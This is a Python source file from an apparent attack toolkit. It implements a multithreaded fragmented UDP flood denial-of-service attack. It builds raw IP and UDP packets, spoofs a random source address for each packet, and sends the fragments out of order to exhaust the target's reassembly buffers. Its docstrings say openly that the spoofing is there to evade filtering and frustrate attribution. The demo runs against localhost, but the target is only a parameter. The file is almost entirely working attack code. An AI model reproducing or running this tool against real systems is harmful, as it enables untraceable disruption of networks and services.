import os
import sys
import socket
import struct
import random
import time
import threading

current_dir = os.path.dirname(os.path.abspath(__file__))
if current_dir not in sys.path:
    sys.path.insert(0, current_dir)

try:
    from attack_strategy import AttackStrategy
except ImportError:
    from .attack_strategy import AttackStrategy

"""
UDP Fragmented Flood Attack Implementation

This attack exploits IP fragmentation by sending large UDP packets that are fragmented
at the IP layer, causing the target to consume resources reassembling fragments.
Uses IP SPOOFING to make packets appear from random source addresses.

PACKET STRUCTURE DETAILS:
========================

1. IP HEADER (20 bytes):
    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |Version|  IHL  |Type of Service|          Total Length         |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |         Identification        |Flags|      Fragment Offset    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |  Time to Live |    Protocol   |         Header Checksum       |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Source Address (SPOOFED)                   |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                      Destination Address                      |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

   IP Header Fields:
   - Version: 4 (IPv4)
   - IHL: 5 (Internet Header Length = 20 bytes)
   - Type of Service: 0 (Normal precedence, normal delay)
   - Total Length: Size of IP header + fragment payload
   - Identification: Random 16-bit value for fragment grouping
   - Flags: 3 bits (Reserved=0, DF=0, MF=0/1)
     * Don't Fragment (DF): 0 (allow fragmentation)
     * More Fragments (MF): 1 (more fragments follow) or 0 (last fragment)
   - Fragment Offset: 13 bits, position in original packet (8-byte units)
   - TTL: 64 (Time To Live)
   - Protocol: 17 (UDP)
   - Header Checksum: Calculated by kernel (0x0000 in raw socket)
   - Source Address: SPOOFED random IP address (xxx.xxx.xxx.xxx)
   - Destination Address: Target IP address

2. UDP HEADER (8 bytes) - ONLY IN FIRST FRAGMENT:
    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |          Source Port          |       Destination Port        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |            Length             |           Checksum            |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

   UDP Header Fields:
   - Source Port: Random port (1024-65535)
   - Destination Port: Target port
   - Length: UDP header (8) + TOTAL original payload length
   - Checksum: Calculated using pseudo-header

3. PSEUDO HEADER (for UDP checksum calculation):
    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                         Source Address                        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                      Destination Address                      |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |      Zero     |    Protocol   |          UDP Length           |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

FRAGMENTATION STRATEGY:
======================
- Original UDP packet size: 1500-8000 bytes
- MTU: 1500 bytes (Ethernet standard)
- Fragment payload size: 1480 bytes (1500 - 20 IP header)
- Multiple fragments per original packet
- Each fragment has same IP identification number
- Last fragment has More Fragments (MF) flag = 0
- Fragments sent OUT OF ORDER to maximize processing overhead

MODIFIED ATTACK PACKET STRUCTURE:
=================================

A. FIRST FRAGMENT (contains UDP header):
   +--------------------+
   |    IP Header       | 20 bytes
   | (MF=1, Offset=0)   |
   +--------------------+
   |    UDP Header      | 8 bytes
   +--------------------+
   |    Payload Data    | 1472 bytes (1480-8)
   +--------------------+
   Total: 1500 bytes

B. MIDDLE FRAGMENTS (data only):
   +--------------------+
   |    IP Header       | 20 bytes
   | (MF=1, Offset=N)   |
   +--------------------+
   |    Payload Data    | 1480 bytes
   +--------------------+
   Total: 1500 bytes

C. LAST FRAGMENT (data only):
   +--------------------+
   |    IP Header       | 20 bytes
   | (MF=0, Offset=N)   |
   +--------------------+
   |    Payload Data    | Variable (remaining bytes)
   +--------------------+
   Total: 20 + remaining bytes

ATTACK MECHANICS WITH IP SPOOFING:
=================================
- Generates RANDOM SPOOFED source IP for each packet
- Sends fragmented UDP packets to exhaust reassembly buffers
- Uses IP spoofing to avoid detection and source-based filtering
- Fragments are sent out of order to maximize processing overhead
- Target must allocate memory for partial packet reassembly
- Incomplete fragments consume resources until timeout
- Multiple spoofed sources make the attack appear distributed

IP SPOOFING IMPLEMENTATION:
==========================
- Each worker thread generates random source IP (xxx.xxx.xxx.xxx)
- Source IP range: 1.1.1.1 to 254.254.254.254
- Random source port: 1024-65535
- Makes traffic appear to come from different hosts
- Bypasses simple IP-based filtering/blocking
- Complicates attack attribution and response
- Uses IP spoofing to avoid detection and filtering
- Fragments are sent out of order to maximize processing overhead
- Target must allocate memory for partial packet reassembly
- Incomplete fragments consume resources until timeout
"""


class FragmentedUDPFlood(AttackStrategy):
    """
    Concrete implementation of the AttackStrategy for Fragmented UDP Flood attacks.

    This attack sends large UDP packets that are fragmented at the IP layer,
    forcing the target to consume resources reassembling fragments.

    KEY FEATURES:
    - Uses IP SPOOFING to generate random source IP addresses
    - Sends fragments out of order to maximize processing overhead
    - Exploits fragment reassembly buffers to cause resource exhaustion
    - Bypasses simple IP-based filtering through source address randomization

    ATTACK MECHANISM:
    1. Generate random spoofed source IP address
    2. Create large UDP packet (1500-8000 bytes)
    3. Fragment packet into multiple IP fragments
    4. Send fragments out of order with spoofed source
    5. Target must allocate resources to reassemble fragments
    6. Incomplete/delayed fragments waste memory until timeout
    """

    def __init__(
        self,
        target_ip,
        target_port,
        duration=60,
        threads=20,
        min_packet_size=1500,
        max_packet_size=8000,
    ):
        super().__init__(target_ip, target_port, duration, threads)
        self.fragment_size = 1480
        self.max_packet_size = max_packet_size
        self.min_packet_size = min_packet_size

    def _create_ip_header(
        self, source_ip, dest_ip, total_length, identification, flags, fragment_offset
    ):
        """Create an IP header for the fragmented packet."""
        version = 4
        ihl = 5  # Header length in 32-bit words
        tos = 0
        ttl = 64
        protocol = socket.IPPROTO_UDP
        check = 0
        saddr = socket.inet_aton(source_ip)
        daddr = socket.inet_aton(dest_ip)

        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            (version << 4) + ihl,
            tos,
            total_length,
            identification,
            flags | fragment_offset,
            ttl,
            protocol,
            check,
            saddr,
            daddr,
        )

        return ip_header

    def _create_udp_header(self, source_port, dest_port, udp_length):
        """Create a UDP header."""
        checksum = 0

        udp_header = struct.pack(
            "!HHHH",
            source_port,
            dest_port,
            udp_length,
            checksum,
        )

        return udp_header

    def _calculate_udp_checksum(self, source_ip, dest_ip, udp_header, udp_data):
        """Calculate UDP checksum using pseudo-header."""
        pseudo_header = struct.pack(
            "!4s4sBBH",
            socket.inet_aton(source_ip),
            socket.inet_aton(dest_ip),
            0,
            socket.IPPROTO_UDP,
            len(udp_header) + len(udp_data),
        )

        checksum_data = pseudo_header + udp_header + udp_data
        return self.checksum(checksum_data)

    def _create_fragment(
        self,
        source_ip,
        dest_ip,
        source_port,
        dest_port,
        identification,
        fragment_data,
        fragment_offset,
        more_fragments,
    ):
        """Create a single IP fragment containing UDP data."""
        offset_units = fragment_offset // 8

        # Set flags
        flags = 0x0000  # Don't Fragment = 0
        if more_fragments:
            flags |= 0x2000  # More Fragments = 1

        if fragment_offset == 0:
            # Create UDP header (only in first fragment)
            udp_length = 8 + len(fragment_data)
            udp_header = self._create_udp_header(source_port, dest_port, udp_length)

            udp_checksum = self._calculate_udp_checksum(
                source_ip, dest_ip, udp_header, fragment_data
            )

            udp_header = struct.pack(
                "!HHHH", source_port, dest_port, udp_length, udp_checksum
            )

            fragment_payload = udp_header + fragment_data
        else:
            # Subsequent fragments contain only data
            fragment_payload = fragment_data

        total_length = 20 + len(fragment_payload)

        ip_header = self._create_ip_header(
            source_ip, dest_ip, total_length, identification, flags, offset_units
        )

        packet = ip_header + fragment_payload
        return packet

    def _create_fragmented_udp_packet(self, source_ip, dest_ip, source_port, dest_port):
        """Create a large UDP packet and fragment it."""
        payload_size = random.randint(self.min_packet_size, self.max_packet_size)
        payload_data = bytes([random.randint(0, 255) for _ in range(payload_size)])
        identification = random.randint(1, 65535)

        fragments = []
        fragment_offset = 0

        # First fragment includes UDP header space
        first_fragment_data_size = self.fragment_size - 8  # Account for UDP header
        first_fragment_data = payload_data[:first_fragment_data_size]

        more_fragments = len(payload_data) > first_fragment_data_size
        first_fragment = self._create_fragment(
            source_ip,
            dest_ip,
            source_port,
            dest_port,
            identification,
            first_fragment_data,
            fragment_offset,
            more_fragments,
        )
        fragments.append(first_fragment)

        fragment_offset += 8 + len(first_fragment_data)
        remaining_data = payload_data[first_fragment_data_size:]

        # Create subsequent fragments
        while remaining_data:
            fragment_data = remaining_data[: self.fragment_size]
            remaining_data = remaining_data[self.fragment_size :]

            more_fragments = len(remaining_data) > 0

            fragment = self._create_fragment(
                source_ip,
                dest_ip,
                source_port,
                dest_port,
                identification,
                fragment_data,
                fragment_offset,
                more_fragments,
            )
            fragments.append(fragment)

            fragment_offset += len(fragment_data)

        self.logger.debug(
            f"Created {len(fragments)} fragments for packet ID {identification}"
        )
        return fragments

    def _send_fragments(self, fragments, dest_ip):
        """Send fragments to the target, potentially out of order."""
        sent_count = 0

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            fragment_order = list(range(len(fragments)))
            random.shuffle(fragment_order)

            for i in fragment_order:
                try:
                    sock.sendto(fragments[i], (dest_ip, 0))
                    sent_count += 1
                    time.sleep(0.001)

                except Exception as e:
                    self.logger.error(f"Error sending fragment {i}: {e}")
                    continue

            sock.close()

        except Exception as e:
            error_msg = f"Error creating socket for fragments: {e}"
            self.logger.error(error_msg)
            self._print_error(error_msg)
            return 0

        return sent_count

    def _check_privileges(self):
        """Check if running with appropriate privileges for UDP raw sockets."""
        return self._check_raw_socket_privileges(socket.IPPROTO_UDP)

    def _start_worker_threads(self):
        """Start worker threads for the fragmented UDP flood attack."""
        threads = []
        for i in range(self.threads):
            thread = threading.Thread(
                target=self._udp_fragment_worker, name=f"UDPFragFlood-{i}"
            )
            thread.daemon = True
            thread.start()
            threads.append(thread)
        return threads

    def _udp_fragment_worker(self):
        """Worker thread for sending fragmented UDP packets with IP spoofing."""
        thread_id = threading.current_thread().ident
        self.logger.debug(f"UDP Fragment worker thread {thread_id} started")

        while self.attack_active:
            try:
                source_ip = self.generate_random_ip()
                source_port = random.randint(1024, 65535)

                self.logger.debug(
                    f"Thread {thread_id}: Spoofing source IP {source_ip}:{source_port}"
                )

                fragments = self._create_fragmented_udp_packet(
                    source_ip, self.target_ip, source_port, self.target_port
                )

                sent_count = self._send_fragments(fragments, self.target_ip)

                if sent_count > 0:
                    self.packets_sent += sent_count
                    self.logger.debug(
                        f"Sent {sent_count} fragments from spoofed {source_ip}:{source_port}"
                    )

                time.sleep(0.05)

            except Exception as e:
                error_msg = f"Error in UDP fragment worker thread {thread_id}: {e}"
                self.logger.error(error_msg)
                continue

        self.logger.debug(f"UDP Fragment worker thread {thread_id} stopped")

    def _monitor_attack_progress(self, start_time):
        """Monitor and display fragmented UDP attack progress."""
        try:
            while time.time() - start_time < self.duration:
                elapsed = time.time() - start_time
                rate = self.packets_sent / elapsed if elapsed > 0 else 0

                rate_color = self._get_rate_color(rate)

                progress_msg = f"Elapsed: {elapsed:.1f}s | Fragments: {self.packets_sent} | Rate: {rate:.1f} fps"
                self._print_colored(f"\r{progress_msg}", rate_color, end="")

                if int(elapsed) % 10 == 0 and int(elapsed) > 0:
                    self.logger.info(f"UDP Fragment attack progress - {progress_msg}")

                time.sleep(1)
        except KeyboardInterrupt:
            self._print_warning("\nUDP Fragment attack interrupted by user")
            self.logger.warning("UDP Fragment attack interrupted by user")

    def attack(self):
        """Execute the Fragmented UDP Flood attack with IP spoofing."""
        self._display_attack_header()

        self.logger.info(
            f"Starting Fragmented UDP Flood attack on {self.target_ip}:{self.target_port}"
        )
        self.logger.info(
            f"Attack parameters - Duration: {self.duration}s, Threads: {self.threads}"
        )
        self.logger.info(
            f"Fragment configuration - Max size: {self.fragment_size} bytes, Packet size: {self.min_packet_size}-{self.max_packet_size} bytes"
        )
        self.logger.info(
            "IP SPOOFING ENABLED: Using random source IP addresses for each packet"
        )

        if not self._check_privileges():
            return

        self.attack_active = True
        start_time = time.time()

        self._print_header("Starting UDP fragment attack threads...")
        self._print_info("🎭 IP Spoofing: Each packet uses a random source IP address")
        self._print_info(
            "🧩 Fragmentation: Large packets split into multiple fragments"
        )
        self._print_info(
            "🔀 Out-of-order: Fragments sent randomly to maximize processing overhead"
        )

        self.logger.info(
            f"Starting {self.threads} UDP fragment worker threads with IP spoofing"
        )

        threads = self._start_worker_threads()

        self._print_success(f"✓ {self.threads} UDP fragment worker threads started")
        self._print_info("Fragmented UDP attack in progress... Press Ctrl+C to stop")

        self._monitor_attack_progress(start_time)

        self.attack_active = False
        self._print_info("\nStopping UDP fragment attack threads...")

        for thread in threads:
            thread.join(timeout=1)

        self._display_attack_completion(start_time)


if __name__ == "__main__":
    import logging

    logging.basicConfig(
        level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
    )

    target_ip = "127.0.0.1"  # Localhost for testing
    target_port = 53  # DNS port

    attack = FragmentedUDPFlood(target_ip, target_port, duration=5, threads=3)
    attack.attack()
